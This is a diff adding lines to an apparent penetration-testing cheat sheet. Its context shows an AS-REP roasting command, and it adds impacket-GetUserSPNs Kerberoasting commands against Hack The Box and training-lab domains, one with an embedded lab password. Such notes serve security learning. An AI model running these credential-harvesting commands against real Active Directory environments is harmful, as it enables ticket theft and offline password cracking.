@@ -1004,6 +1004,11 @@ Metasploit
 # AS-REP Roasting with account svc-alfresco ( find account have “Do not require Kerberos preauthentication” , get ticket have NTLM hash to crack )  
 impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.129.95.210 -no-pass
 
+# Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
+impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
+or ( get all ) 
+impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
+
 ```
 ## Metasploit
 
